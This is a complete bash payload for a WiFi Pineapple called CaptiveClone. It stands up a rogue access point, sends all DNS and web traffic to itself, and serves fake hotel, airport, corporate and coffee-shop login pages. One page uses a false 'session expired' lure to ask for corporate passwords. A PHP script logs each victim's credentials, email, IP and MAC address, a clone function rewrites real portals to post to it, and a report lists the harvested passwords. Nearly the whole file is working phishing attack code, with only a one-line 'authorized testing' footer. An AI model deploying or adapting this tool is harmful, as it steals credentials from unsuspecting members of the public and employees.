#!/bin/bash
###############################################################################
# CaptiveClone — Captive Portal Cloner & Credential Harvester
# NullSec Suite | WiFi Pineapple Mark VII / Nano / Tetra
#
# Automatically clones the look and feel of real captive portals
# (hotel, airport, coffee shop, corporate) and serves them on a rogue AP.
# Captures credentials, session tokens, and HTTP form data.
# Features template engine, SSL stripping, and auto-redirect.
#
# Author : bad-antics (NullSec)
# Version: 1.0.0
# License: MIT
###############################################################################

PAYLOAD_DIR="/root/payloads/CaptiveClone"
LOOT_DIR="/root/loot/captiveclone"
LOG_FILE="$LOOT_DIR/captiveclone.log"
PORTAL_DIR="$LOOT_DIR/portal"
CRED_FILE="$LOOT_DIR/credentials.csv"
REPORT_FILE="$LOOT_DIR/captive_report.html"
TEMPLATES_DIR="$PAYLOAD_DIR/templates"
IFACE=""
IFACE_INTERNET=""

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
CYN='\033[0;36m'; WHT='\033[1;37m'; RST='\033[0m'

log()  { echo -e "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_FILE"; }
ok()   { log "${GRN}[✓]${RST} $*"; }
warn() { log "${YEL}[!]${RST} $*"; }
fail() { log "${RED}[✗]${RST} $*"; }
info() { log "${CYN}[i]${RST} $*"; }

banner() {
    echo -e "${WHT}"
    cat << 'EOF'
   ____            _   _           ____ _
  / ___|__ _ _ __ | |_(_)_   ___ / ___| | ___  _ __   ___
 | |   / _` | '_ \| __| \ \ / / | |   | |/ _ \| '_ \ / _ \
 | |__| (_| | |_) | |_| |\ V /| | |___| | (_) | | | |  __/
  \____\__,_| .__/ \__|_| \_/  \ \____|_|\___/|_| |_|\___|
             |_|                 \___|
            NullSec Portal Cloner
EOF
    echo -e "${RST}"
}

# ── Pre-flight ─────────────────────────────────────────────────────────────
preflight() {
    mkdir -p "$LOOT_DIR" "$PORTAL_DIR" "$TEMPLATES_DIR"
    > "$LOG_FILE"
    echo "timestamp,source_ip,mac,username,password,portal_type,user_agent" > "$CRED_FILE"

    IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
    if [ -z "$IFACE" ]; then
        fail "No wireless interface found"
        exit 1
    fi

    # Check for second interface (internet uplink)
    IFACE_INTERNET=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | tail -1)
    [ "$IFACE_INTERNET" == "$IFACE" ] && IFACE_INTERNET=""

    # Install dependencies
    for pkg in lighttpd php7-cgi php7-mod-json dnsmasq nodogsplash; do
        command -v "$pkg" &>/dev/null || opkg install "$pkg" 2>/dev/null
    done

    ok "Interface: $IFACE"
    [ -n "$IFACE_INTERNET" ] && ok "Internet uplink: $IFACE_INTERNET"
}

# ── Portal templates ──────────────────────────────────────────────────────
create_template_hotel() {
    local dir="$TEMPLATES_DIR/hotel"
    mkdir -p "$dir"
    cat > "$dir/index.html" << 'TEOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Hotel WiFi — Guest Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,#1a1c2e 0%,#2d1b3d 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:#fff;border-radius:16px;padding:48px;max-width:420px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.logo{text-align:center;margin-bottom:32px}
.logo h1{font-size:28px;color:#1a1c2e;margin-bottom:4px}
.logo p{color:#888;font-size:14px}
.form-group{margin-bottom:20px}
.form-group label{display:block;font-size:13px;color:#555;margin-bottom:6px;font-weight:600}
.form-group input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:15px;transition:border-color 0.3s}
.form-group input:focus{border-color:#6c5ce7;outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#6c5ce7,#a29bfe);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:transform 0.2s}
.btn:hover{transform:translateY(-2px)}
.terms{font-size:11px;color:#999;text-align:center;margin-top:16px}
</style></head><body>
<div class="container">
<div class="logo"><h1>🏨 Guest WiFi</h1><p>Welcome — Please sign in to continue</p></div>
<form method="POST" action="/capture">
<div class="form-group"><label>Room Number</label><input type="text" name="username" placeholder="e.g., 412" required></div>
<div class="form-group"><label>Last Name</label><input type="text" name="password" placeholder="As on reservation" required></div>
<div class="form-group"><label>Email Address</label><input type="email" name="email" placeholder="your@email.com"></div>
<button type="submit" class="btn">Connect to WiFi</button>
</form>
<p class="terms">By connecting you agree to our Terms of Service and Privacy Policy</p>
</div></body></html>
TEOF
    ok "Hotel template created"
}

create_template_airport() {
    local dir="$TEMPLATES_DIR/airport"
    mkdir -p "$dir"
    cat > "$dir/index.html" << 'TEOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Airport Free WiFi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:#fff;border-radius:12px;padding:40px;max-width:440px;width:90%;box-shadow:0 4px 24px rgba(0,0,0,0.1)}
.header{text-align:center;border-bottom:3px solid #0066cc;padding-bottom:20px;margin-bottom:24px}
.header h1{font-size:24px;color:#0066cc}
.header p{color:#666;font-size:14px;margin-top:4px}
.form-group{margin-bottom:18px}
.form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:600}
.form-group input,.form-group select{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:6px;font-size:14px}
.btn{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer}
.btn:hover{background:#0052a3}
.premium{background:#f8f9fa;border-radius:8px;padding:16px;margin-top:20px;border:1px solid #e0e0e0}
.premium h3{font-size:14px;color:#333;margin-bottom:8px}
.premium p{font-size:12px;color:#666}
</style></head><body>
<div class="container">
<div class="header"><h1>✈️ Airport Free WiFi</h1><p>30 minutes complimentary access</p></div>
<form method="POST" action="/capture">
<div class="form-group"><label>Full Name</label><input type="text" name="username" placeholder="As on boarding pass" required></div>
<div class="form-group"><label>Flight Number</label><input type="text" name="password" placeholder="e.g., AA1234"></div>
<div class="form-group"><label>Email for receipt</label><input type="email" name="email" placeholder="your@email.com" required></div>
<button type="submit" class="btn">Get Free WiFi</button>
</form>
<div class="premium"><h3>🌟 Premium High-Speed</h3><p>Upgrade to premium for unlimited HD streaming. $9.99/session.</p></div>
</div></body></html>
TEOF
    ok "Airport template created"
}

create_template_corporate() {
    local dir="$TEMPLATES_DIR/corporate"
    mkdir -p "$dir"
    cat > "$dir/index.html" << 'TEOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Corporate Network — Authentication Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,#0f172a,#1e293b);min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:#fff;border-radius:8px;padding:40px;max-width:400px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,0.3)}
.logo{text-align:center;margin-bottom:24px}
.logo .icon{font-size:48px;margin-bottom:8px}
.logo h2{color:#1e293b;font-size:20px}
.logo p{color:#64748b;font-size:13px}
.alert{background:#fef2f2;border:1px solid #fecaca;border-radius:6px;padding:12px;margin-bottom:20px;font-size:12px;color:#991b1b}
.form-group{margin-bottom:16px}
.form-group label{display:block;font-size:12px;color:#475569;margin-bottom:4px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px}
.form-group input{width:100%;padding:12px;border:1px solid #cbd5e1;border-radius:6px;font-size:14px}
.btn{width:100%;padding:14px;background:#1e40af;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer}
.help{text-align:center;margin-top:16px;font-size:12px;color:#94a3b8}
.help a{color:#1e40af}
</style></head><body>
<div class="container">
<div class="logo"><div class="icon">🏢</div><h2>Corporate WiFi</h2><p>Network authentication required</p></div>
<div class="alert">⚠ Your session has expired. Please re-authenticate with your corporate credentials.</div>
<form method="POST" action="/capture">
<div class="form-group"><label>Username / Employee ID</label><input type="text" name="username" placeholder="john.doe" required></div>
<div class="form-group"><label>Password</label><input type="password" name="password" placeholder="••••••••" required></div>
<div class="form-group"><label>Domain</label>
<select name="domain"><option>CORP</option><option>GUEST</option><option>CONTRACTOR</option></select></div>
<button type="submit" class="btn">Authenticate</button>
</form>
<p class="help">Forgot password? <a href="#">Contact IT Helpdesk</a></p>
</div></body></html>
TEOF
    ok "Corporate template created"
}

create_template_cafe() {
    local dir="$TEMPLATES_DIR/cafe"
    mkdir -p "$dir"
    cat > "$dir/index.html" << 'TEOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Free WiFi — Coffee Shop</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#faf5f0;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:#fff;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,0.08)}
.header{text-align:center;margin-bottom:28px}
.header h1{font-size:32px;margin-bottom:4px}
.header h2{color:#6b4226;font-size:20px}
.header p{color:#999;font-size:13px;margin-top:8px}
.social{display:flex;gap:12px;margin-bottom:20px}
.social button{flex:1;padding:12px;border:1px solid #ddd;border-radius:8px;background:#fff;font-size:14px;cursor:pointer}
.social button:hover{background:#f5f5f5}
.divider{text-align:center;color:#ccc;margin:16px 0;position:relative}
.divider::before,.divider::after{content:'';position:absolute;top:50%;width:40%;height:1px;background:#e0e0e0}
.divider::before{left:0}.divider::after{right:0}
.form-group{margin-bottom:16px}
.form-group input{width:100%;padding:14px;border:1px solid #e0e0e0;border-radius:8px;font-size:14px}
.btn{width:100%;padding:14px;background:#6b4226;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
</style></head><body>
<div class="container">
<div class="header"><h1>☕</h1><h2>Free WiFi</h2><p>Connect with your social account or email</p></div>
<div class="social">
<button onclick="document.getElementById('email-form').style.display='block'">📧 Email</button>
<button onclick="window.location='/capture?social=facebook'">👤 Facebook</button>
<button onclick="window.location='/capture?social=google'">🔵 Google</button>
</div>
<div class="divider">or</div>
<form method="POST" action="/capture" id="email-form">
<div class="form-group"><input type="email" name="username" placeholder="Email address" required></div>
<div class="form-group"><input type="text" name="password" placeholder="Name (optional)"></div>
<button type="submit" class="btn">Connect Free</button>
</form>
</div></body></html>
TEOF
    ok "Cafe template created"
}

# ── Credential capture script (PHP) ──────────────────────────────────────
create_capture_script() {
    cat > "$PORTAL_DIR/capture.php" << 'PEOF'
<?php
$timestamp = date('Y-m-d\TH:i:s\Z');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$mac = trim(shell_exec("arp -n " . escapeshellarg($ip) . " 2>/dev/null | awk 'NR==2{print $3}'"));

$username = $_POST['username'] ?? $_GET['username'] ?? '';
$password = $_POST['password'] ?? $_GET['password'] ?? '';
$email    = $_POST['email'] ?? '';
$domain   = $_POST['domain'] ?? '';
$social   = $_GET['social'] ?? '';

$portal_type = basename(dirname($_SERVER['SCRIPT_FILENAME']));

// Log to CSV
$cred_file = '/root/loot/captiveclone/credentials.csv';
$line = implode(',', [
    $timestamp, $ip, $mac,
    str_replace(',', ';', $username),
    str_replace(',', ';', $password),
    $portal_type, str_replace(',', ';', $ua)
]) . "\n";
file_put_contents($cred_file, $line, FILE_APPEND);

// Log extra data
$extra = [
    'email' => $email, 'domain' => $domain,
    'social' => $social, 'ip' => $ip, 'mac' => $mac
];
file_put_contents('/root/loot/captiveclone/extra_data.json',
    json_encode($extra, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);

// Redirect to internet (or a "success" page)
header('HTTP/1.1 302 Found');
header('Location: http://connectivitycheck.gstatic.com/generate_204');
exit;
?>
PEOF
    ok "Capture script created"
}

# ── DHCP + DNS configuration ──────────────────────────────────────────────
configure_networking() {
    local ssid="$1" channel="${2:-6}"
    info "Configuring rogue AP networking..."

    # Assign IP to interface
    ifconfig "$IFACE" 10.0.0.1 netmask 255.255.255.0 up

    # dnsmasq config — DHCP + DNS redirect
    cat > /tmp/dnsmasq-captive.conf << DEOF
interface=$IFACE
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
# Redirect all DNS to our portal
address=/#/10.0.0.1
DEOF

    # hostapd config
    cat > /tmp/hostapd-captive.conf << HEOF
interface=$IFACE
ssid=$ssid
channel=$channel
hw_mode=g
ieee80211n=1
HEOF

    # iptables: redirect HTTP/HTTPS to portal
    iptables -t nat -F
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 80
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 80

    # Allow internet forwarding if uplink available
    if [ -n "$IFACE_INTERNET" ]; then
        echo 1 > /proc/sys/net/ipv4/ip_forward
        iptables -t nat -A POSTROUTING -o "$IFACE_INTERNET" -j MASQUERADE
    fi

    ok "Networking configured (DHCP: 10.0.0.10-250, DNS: redirect all)"
}

# ── Launch portal ──────────────────────────────────────────────────────────
launch_portal() {
    local template="$1" ssid="${2:-Free_WiFi}" channel="${3:-6}"
    
    if [ ! -d "$TEMPLATES_DIR/$template" ]; then
        fail "Template not found: $template"
        return 1
    fi

    info "Launching CaptiveClone with '$template' template..."
    info "SSID: $ssid | Channel: $channel"

    # Copy template to portal directory
    rm -rf "$PORTAL_DIR"/*
    cp -r "$TEMPLATES_DIR/$template/"* "$PORTAL_DIR/"
    create_capture_script

    # Configure lighttpd
    cat > /tmp/lighttpd-captive.conf << LEOF
server.document-root = "$PORTAL_DIR"
server.port = 80
server.modules = ("mod_cgi", "mod_redirect")
server.errorlog = "$LOOT_DIR/lighttpd_error.log"
cgi.assign = (".php" => "/usr/bin/php-cgi")
index-file.names = ("index.html", "index.php")
\$HTTP["url"] =~ "^/capture" {
    cgi.assign = (".php" => "/usr/bin/php-cgi")
}
# Redirect all unknown URLs to portal
server.error-handler-404 = "/index.html"
LEOF

    configure_networking "$ssid" "$channel"

    # Start services
    dnsmasq -C /tmp/dnsmasq-captive.conf &
    echo $! > "$LOOT_DIR/dnsmasq.pid"

    hostapd /tmp/hostapd-captive.conf &
    echo $! > "$LOOT_DIR/hostapd.pid"

    lighttpd -f /tmp/lighttpd-captive.conf &
    echo $! > "$LOOT_DIR/lighttpd.pid"

    ok "Portal live! Monitoring for credentials..."

    # Monitor loop
    local total_creds=0
    while true; do
        local current
        current=$(tail -n +2 "$CRED_FILE" | wc -l)
        if [ "$current" -gt "$total_creds" ]; then
            local new=$((current - total_creds))
            warn "🔓 $new new credential(s) captured! (Total: $current)"
            total_creds=$current
        fi
        sleep 5
    done
}

# ── Stop portal ────────────────────────────────────────────────────────────
stop_portal() {
    info "Stopping CaptiveClone..."
    for pidfile in "$LOOT_DIR"/*.pid; do
        [ -f "$pidfile" ] && kill "$(cat "$pidfile")" 2>/dev/null && rm "$pidfile"
    done
    iptables -t nat -F
    ok "Portal stopped"
}

# ── Clone a live portal ───────────────────────────────────────────────────
clone_portal() {
    local url="$1" name="${2:-cloned}"
    info "Cloning portal from: $url"

    local dir="$TEMPLATES_DIR/$name"
    mkdir -p "$dir"

    # Download the portal page
    wget -q --no-check-certificate -p -k -P "$dir" "$url" 2>/dev/null

    # Flatten directory structure
    if [ -d "$dir/"* ]; then
        find "$dir" -name "*.html" -exec mv {} "$dir/index.html" \; 2>/dev/null
        find "$dir" -name "*.css" -exec mv {} "$dir/" \; 2>/dev/null
        find "$dir" -name "*.js" -exec mv {} "$dir/" \; 2>/dev/null
        find "$dir" -name "*.png" -o -name "*.jpg" -o -name "*.svg" -exec mv {} "$dir/" \; 2>/dev/null
    fi

    # Modify form actions to point to our capture script
    if [ -f "$dir/index.html" ]; then
        sed -i 's|action="[^"]*"|action="/capture.php"|g' "$dir/index.html"
        sed -i 's|method="get"|method="post"|g' "$dir/index.html"
        ok "Portal cloned and form actions redirected"
    else
        warn "Could not find index.html in cloned content"
    fi
}

# ── Report ─────────────────────────────────────────────────────────────────
generate_report() {
    info "Generating CaptiveClone report..."

    local cred_count
    cred_count=$(tail -n +2 "$CRED_FILE" 2>/dev/null | wc -l || echo 0)

    cat > "$REPORT_FILE" << HTMLEOF
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>CaptiveClone Report — NullSec</title>
<style>
:root{--bg:#0a0e17;--card:#111827;--accent:#f59e0b;--red:#ef4444;--grn:#22c55e;--txt:#e0e0e0}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--txt);font-family:'Segoe UI',system-ui,sans-serif;padding:24px}
h1{color:var(--accent);font-size:28px;margin-bottom:24px}
.stat{display:inline-block;background:var(--card);border-radius:12px;padding:20px 40px;text-align:center;border:1px solid #222;margin-right:16px;margin-bottom:24px}
.stat .n{font-size:42px;font-weight:700;color:var(--red)}
.stat .l{font-size:13px;color:#888;margin-top:4px}
h2{color:var(--accent);margin:16px 0 12px}
table{width:100%;border-collapse:collapse;background:var(--card);border-radius:12px;overflow:hidden;margin-bottom:24px}
th{background:#1a2332;color:var(--accent);padding:14px 16px;text-align:left;font-size:12px;text-transform:uppercase}
td{padding:10px 16px;border-bottom:1px solid #1a1a2e;font-size:13px}
.cred{color:var(--red);font-weight:bold}
.footer{margin-top:32px;text-align:center;color:#555;font-size:12px}
</style></head><body>
<h1>🎣 CaptiveClone Credential Report</h1>
<div class="stat"><div class="n">$cred_count</div><div class="l">Credentials Captured</div></div>

<h2>Harvested Credentials</h2>
<table><thead><tr><th>Time</th><th>IP</th><th>MAC</th><th>Username</th><th>Password</th><th>Portal</th></tr></thead><tbody>
HTMLEOF

    tail -n +2 "$CRED_FILE" 2>/dev/null | while IFS=',' read -r ts ip mac user pass portal ua; do
        echo "<tr><td>$ts</td><td>$ip</td><td>$mac</td><td>$user</td><td class=\"cred\">$pass</td><td>$portal</td></tr>" >> "$REPORT_FILE"
    done

    cat >> "$REPORT_FILE" << 'HTMLEOF'
</tbody></table>
<div class="footer">CaptiveClone v1.0.0 — NullSec Suite — For authorized testing only</div>
</body></html>
HTMLEOF

    ok "Report: $REPORT_FILE"
}

LED() { command -v LED &>/dev/null && command LED "$@" 2>/dev/null; true; }

# ── Menu ───────────────────────────────────────────────────────────────────
show_menu() {
    while true; do
        echo ""
        echo -e "${WHT}╔═══════════════════════════════════════════╗${RST}"
        echo -e "${WHT}║    CaptiveClone — Portal Cloner           ║${RST}"
        echo -e "${WHT}╠═══════════════════════════════════════════╣${RST}"
        echo -e "${WHT}║${RST} [1] Launch Hotel Portal                     ${WHT}║${RST}"
        echo -e "${WHT}║${RST} [2] Launch Airport Portal                   ${WHT}║${RST}"
        echo -e "${WHT}║${RST} [3] Launch Corporate Portal                 ${WHT}║${RST}"
        echo -e "${WHT}║${RST} [4] Launch Cafe Portal                      ${WHT}║${RST}"
        echo -e "${WHT}║${RST} [5] Clone Live Portal (URL)                 ${WHT}║${RST}"
        echo -e "${WHT}║${RST} [6] Launch Custom Template                  ${WHT}║${RST}"
        echo -e "${WHT}║${RST} [7] Stop Portal                             ${WHT}║${RST}"
        echo -e "${WHT}║${RST} [8] View Credentials                        ${WHT}║${RST}"
        echo -e "${WHT}║${RST} [9] Generate Report                         ${WHT}║${RST}"
        echo -e "${WHT}║${RST} [0] Exit                                    ${WHT}║${RST}"
        echo -e "${WHT}╚═══════════════════════════════════════════╝${RST}"
        echo ""
        read -rp "Select> " choice

        case "$choice" in
            1) create_template_hotel
               read -rp "SSID [Hotel_Guest_WiFi]: " ssid
               launch_portal "hotel" "${ssid:-Hotel_Guest_WiFi}" ;;
            2) create_template_airport
               read -rp "SSID [Airport_Free_WiFi]: " ssid
               launch_portal "airport" "${ssid:-Airport_Free_WiFi}" ;;
            3) create_template_corporate
               read -rp "SSID [CORP-SECURE]: " ssid
               launch_portal "corporate" "${ssid:-CORP-SECURE}" ;;
            4) create_template_cafe
               read -rp "SSID [CoffeeShop_Free]: " ssid
               launch_portal "cafe" "${ssid:-CoffeeShop_Free}" ;;
            5) read -rp "Portal URL: " url
               read -rp "Template name: " name
               clone_portal "$url" "$name"
               read -rp "SSID: " ssid
               launch_portal "$name" "$ssid" ;;
            6) echo "Available: $(ls "$TEMPLATES_DIR")"
               read -rp "Template: " t; read -rp "SSID: " s
               launch_portal "$t" "$s" ;;
            7) stop_portal ;;
            8) column -t -s',' "$CRED_FILE" 2>/dev/null ;;
            9) generate_report ;;
            0) stop_portal; exit 0 ;;
            *) warn "Invalid" ;;
        esac
    done
}

main() {
    banner
    preflight
    case "$1" in
        --hotel)     create_template_hotel; launch_portal "hotel" "${2:-Hotel_Guest_WiFi}" ;;
        --airport)   create_template_airport; launch_portal "airport" "${2:-Airport_Free_WiFi}" ;;
        --corporate) create_template_corporate; launch_portal "corporate" "${2:-CORP-SECURE}" ;;
        --cafe)      create_template_cafe; launch_portal "cafe" "${2:-CoffeeShop_Free}" ;;
        --stop)      stop_portal ;;
        *)           show_menu ;;
    esac
}

main "$@"
